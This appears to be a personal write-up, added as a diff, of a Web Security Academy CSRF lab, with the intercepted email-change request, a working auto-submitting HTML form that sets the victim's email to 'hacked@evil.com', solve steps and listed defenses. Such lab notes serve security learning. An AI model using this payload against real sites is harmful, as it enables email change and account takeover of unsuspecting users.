@@ -1,0 +1,69 @@
+================================
+LAB: CSRF vulnerability with no defenses
+================================
+
+[LAB INFORMATION]
+-----------------
+Date: February 02, 2026
+Lab URL: https://0a5e00a804ad636c80b6037200c100f9.web-security-academy.net
+Category: CSRF
+Level: Apprentice
+Objective: Use CSRF to change victim's email address
+Credentials: wiener:peter
+
+[RECONNAISSANCE]
+----------------
+Logged in and found email change form at /my-account.
+
+Intercepted the email change request in Burp:
+POST /my-account/change-email HTTP/2
+Host: 0a5e00a804ad636c80b6037200c100f9.web-security-academy.net
+Cookie: session=feHSCmCNbYjKdZLBiMlp5vYl89p1CtJD
+Content-Type: application/x-www-form-urlencoded
+
+email=test%40test.com
+
+[VULNERABILITY DISCOVERY]
+-------------------------
+No CSRF token in the request.
+No custom headers.
+Only requires session cookie + email parameter.
+Classic CSRF with zero defenses.
+
+[EXPLOITATION]
+--------------
+Created HTML payload on exploit server:
+
+<html>
+  <body>
+    <form action="https://0a5e00a804ad636c80b6037200c100f9.web-security-academy.net/my-account/change-email" method="POST">
+      <input type="hidden" name="email" value="hacked@evil.com" />
+    </form>
+    <script>
+      document.forms[0].submit();
+    </script>
+  </body>
+</html>
+
+Steps:
+1. Pasted payload in exploit server Body
+2. Clicked "Store"
+3. Clicked "Deliver exploit to victim"
+4. Lab solved
+
+Attack works because victim's browser automatically sends their session cookie when the form submits.
+
+[EVIDENCE]
+----------
+Lab marked as solved after delivering exploit.
+
+[LESSONS LEARNED]
+-----------------
+CSRF happens when apps rely only on cookies for auth without validating request origin.
+
+Defenses needed:
+- CSRF tokens in forms
+- SameSite cookie attribute
+- Origin/Referer validation
+
+Attack chain: email change → password reset to attacker email → account takeover.
